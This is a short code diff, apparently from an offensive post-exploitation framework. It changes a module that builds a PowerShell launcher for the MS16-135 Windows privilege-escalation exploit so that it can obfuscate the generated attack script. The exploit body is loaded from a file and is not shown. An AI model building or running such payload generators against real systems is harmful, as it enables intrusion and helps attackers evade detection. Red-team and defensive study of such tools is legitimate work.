@@ -73,7 +73,7 @@ class Module:
                     self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS16135.ps1"
         try:
@@ -101,5 +101,6 @@ class Module:
         
         script += 'Invoke-MS16135 -Command "' + launcherCode + '"'
         script += ';`nInvoke-MS16135 completed.'
-
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         return script
